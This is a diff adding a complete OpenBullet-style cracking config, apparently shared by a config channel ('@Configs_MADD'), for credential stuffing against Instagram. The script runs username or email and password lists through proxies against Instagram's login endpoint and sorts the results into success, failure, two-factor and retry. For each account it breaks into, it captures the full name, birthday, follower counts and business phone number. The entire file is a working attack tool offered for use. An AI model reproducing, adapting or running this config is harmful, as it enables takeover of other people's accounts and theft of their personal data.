@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "Instagram [ MADD ] V2",
+  "SuggestedBots": 120,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-07T04:42:06.3725843+08:00",
+  "AdditionalInfo": "",
+  "Author": "@Configs_MADD",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.instagram.com/accounts/login/ajax/" 
+  CONTENT "username=<USER>&enc_password=%23PWD_INSTAGRAM_BROWSER%3a0%3a1628896342%3a<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.instagram.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-IG-App-ID: 936619743392459" 
+  HEADER "X-IG-WWW-Claim: 0" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "X-Instagram-AJAX: f61afa487646" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-ASBD-ID: 198387" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
+  HEADER "X-CSRFToken: gROWXC54uic8pf9qVggpoDYSXiFz3Lfu" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.instagram.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.instagram.com/accounts/login/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ",\"authenticated\":false,\"" 
+    KEY "{\"user\":false,\"" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\":\"checkpoint_required\",\"" 
+  KEYCHAIN Success OR 
+    KEY "\",\"authenticated\":true,\"" 
+  KEYCHAIN Retry OR 
+    KEY "\":\"Please wait a few minutes before you try again.\",\"" 
+
+REQUEST GET "https://www.instagram.com/accounts/edit/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\",\"full_name\":\"" "\"," CreateEmpty=FALSE -> CAP "Full Name " 
+
+PARSE "<SOURCE>" LR ",\"username\":\"" "\"," CreateEmpty=FALSE -> CAP "UserName" 
+
+PARSE "<SOURCE>" LR ",\"birthday\":" ",\"" CreateEmpty=FALSE -> CAP "birthday" 
+
+REQUEST GET "Https://www.instagram.com/<USER>/?__a=1" 
+  
+  HEADER "Host: www.instagram.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"" 
+  HEADER "X-IG-WWW-Claim: hmac.AR2UHFuaN0-k8B5vbbeyh7AHXxrtrCkZYb4Z7BCjy0JJ19OS" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-ASBD-ID: 437806" 
+  HEADER "X-IG-App-ID: 936619743392459" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.instagram.com/<USER>/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" LR ",\"edge_followed_by\":{\"count\":" "}," CreateEmpty=FALSE -> CAP "Followers" 
+
+PARSE "<SOURCE>" LR "edge_follow\":{\"count\":" "},\"" CreateEmpty=FALSE -> CAP "Following" 
+
+PARSE "<SOURCE>" LR "edge_felix_combined_post_uploads\":{\"count\":" ",\"" CreateEmpty=FALSE -> CAP "Posts" 
+
+REQUEST GET "https://www.instagram.com/accounts/professional_account_settings/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR ",\"category_name\":\"" "\"," CreateEmpty=FALSE -> CAP "category" 
+
+PARSE "<SOURCE>" LR ",\"business_phone_number\":" ",\"" CreateEmpty=FALSE -> CAP "Business Phone Number" 
+
+FUNCTION Constant "@MADD_CKR" -> CAP "Config By" 
+
+FUNCTION Constant "@Configs_MADD" -> CAP "Join My Channel Configs" 
+
